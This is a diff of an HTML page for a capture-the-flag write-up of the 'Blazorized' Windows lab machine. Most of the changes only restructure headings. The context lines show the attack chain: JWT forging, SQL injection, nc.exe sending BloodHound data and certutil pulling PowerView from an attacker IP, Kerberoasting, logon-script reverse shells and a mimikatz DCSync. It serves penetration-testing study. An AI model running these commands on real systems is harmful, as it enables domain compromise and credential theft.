@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799082581645">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799084971022">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.7.0">
@@ -32,12 +32,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.7.0.799082581645" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.7.0.799084971022" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799082581645" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799082581645" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799082581645" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799084971022" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -191,12 +191,18 @@
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Blazorized is a Windows machine, starting with a website written using the Blazor .NET framework that allows downloading a DLL file that can be reverse engineered to find a JWT secret and use it to get access to the admin panel. The admin panel is vulnerable to an SQL injection to get code execution. To pivot to the next user, the WriteSPN privilege  can be abused to perform a targeted Kerberoast attack on another user. The targeted user is able to write a logon script that ultimately gives access to a user that allows performing a DCSync attack on the domain.</p>
-<doc-anchor-target id="reconnaissance" class="break-words">
+<doc-anchor-target id="synopsis" class="break-words">
     <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>Blazorized is a Windows machine, starting with a website written using the Blazor .NET framework that allows downloading a DLL file that can be reverse engineered to find a JWT secret and use it to get access to the admin panel. The admin panel is vulnerable to an SQL injection to get code execution. To pivot to the next user, the WriteSPN privilege  can be abused to perform a targeted Kerberoast attack on another user. The targeted user is able to write a logon script that ultimately gives access to a user that allows performing a DCSync attack on the domain.</p>
+<doc-anchor-target id="reconnaissance">
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
         <span>Reconnaissance</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>Starting with an nmap scan, we see that the host is a domain controller and redirects us to <code v-pre>blazorized.htb</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -250,10 +256,10 @@ Host script results:
 </figure>
 </p>
 <doc-anchor-target id="jwt-token-forging">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#jwt-token-forging">#</doc-anchor-trigger>
         <span>JWT Token Forging</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>We can decode the JWT token with <a href="https://jwt.io/">jwt.io</a>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -297,10 +303,10 @@ Host script results:
 }</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="dll-reversing">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#dll-reversing">#</doc-anchor-trigger>
         <span>DLL Reversing</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>After looking at the files one by one and decompiling them using <code v-pre>dnSpy</code> we find something interesting for the <code v-pre>Blazorized.Helpers.dll</code> in the function <code v-pre>JWT</code>.</p>
 <p><figure class="content-center">
@@ -310,10 +316,10 @@ Host script results:
 </p>
 <p>Within the decompiled dll there is a <code v-pre>jwtSymmetricSecurityKey</code> along with several other variables, one of which is an endpoint to the administrator dashboard. We can add this to our hosts file as well.</p>
 <doc-anchor-target id="user">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
         <span>User</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>With the found JWT secret and admin subdomain, we can generate a new JWT token with the following payload and using the signature we found (make sure to increase the expiration to make the token valid for a longer period).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -340,10 +346,10 @@ Host script results:
 </figure>
 </p>
 <doc-anchor-target id="sql-injection">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#sql-injection">#</doc-anchor-trigger>
         <span>SQL Injection</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>The Super Admin Panel allows managing posts. One feature is looking for duplicate post titles that is vulnerable to blind SQL injection. This can be verified by the following payload:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -376,10 +382,10 @@ C:\Windows\system32&gt;whoami
 blazorized\nu_1055</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="root">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
         <span>Root</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>On the machine we see two additional users (<code v-pre>RSA_4810</code> and <code v-pre>SSA_6010</code>).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -396,10 +402,10 @@ blazorized\nu_1055</code></pre>
 06/19/2024  07:39 AM    &lt;DIR&gt;          SSA_6010</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="bloodhound-enumeration">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-enumeration">#</doc-anchor-trigger>
         <span>BloodHound Enumeration</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>Since this is a domain controller and we are a domain user, we can run SharpHound to get more information about the users in the domain and what permissions they have.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -418,6 +424,12 @@ C:\Users\NU_1055&gt; %temp%\nc.exe -w 3 10.10.14.4 4444 &lt; 20241109040008_Bloo
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<doc-anchor-target id="writespn-abuse">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#writespn-abuse">#</doc-anchor-trigger>
+        <span>WriteSPN Abuse</span>
+    </h3>
+</doc-anchor-target>
 <p>We can copy PowerView onto the host and perform the attack from Windows.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
@@ -435,16 +447,18 @@ $krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLEED*$D7234985D58C1...&lt;SNIP
 </doc-codeblock></div>
 <p>The password of the user is <code v-pre>(Ni7856Do9854Ki05Ng0005 #)</code>.</p>
 <doc-anchor-target id="dacl-abuse">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#dacl-abuse">#</doc-anchor-trigger>
         <span>DACL Abuse</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
-<p>We can now login with Evil-WinRM and we look for ACLs that can be abused.</p>
+<p>We can now login with Evil-WinRM.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
-
-*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; upload PowerView.ps1
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'</code></pre>
+</doc-codeblock></div>
+<p>We look for ACLs that can be abused using PowerView.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; upload PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; . .\PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ObjectAceType, ActiveDirectoryRights | fl
 
@@ -459,14 +473,14 @@ ActiveDirectoryRights : WriteProperty
 </doc-codeblock></div>
 <p>We find one ACL for our current user that shows a WriteProperty on the script path of the <code v-pre>SSA_6010</code> user. By having this permission it could allow us to write a custom logon script that executes whenever this user tries to login to the machine. We can look if this user tried to login:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
+<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
 Saturday, November 9, 2024 4:32:38 AM
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; date
 Saturday, November 9, 2024 4:32:44 AM</code></pre>
 </doc-codeblock></div>
 <p>It looks like this person is logging in and out every minute so lets abuse this now. We are able to write a <code v-pre>bat</code> file in <code v-pre>sysvol\[domain]\scripts\</code> and use this to run a reverse shell whenever the user <code v-pre>SSA_6010</code> tries to login. We can check which logon script folder is from our target user by checking the permissions.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; icacls A32FF3AEAA23
+<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; icacls A32FF3AEAA23
 A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
              BLAZORIZED\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(I)(F)
@@ -485,6 +499,12 @@ A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<doc-anchor-target id="dcsync">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dcsync">#</doc-anchor-trigger>
+        <span>DCSync</span>
+    </h3>
+</doc-anchor-target>
 <p>We upload <code v-pre>mimikatz.exe</code> and perform the attack and get the hash of the Domain Admin.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\Public&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:BLAZORIZED.HTB /user:Administrator&quot; &quot;exit&quot;
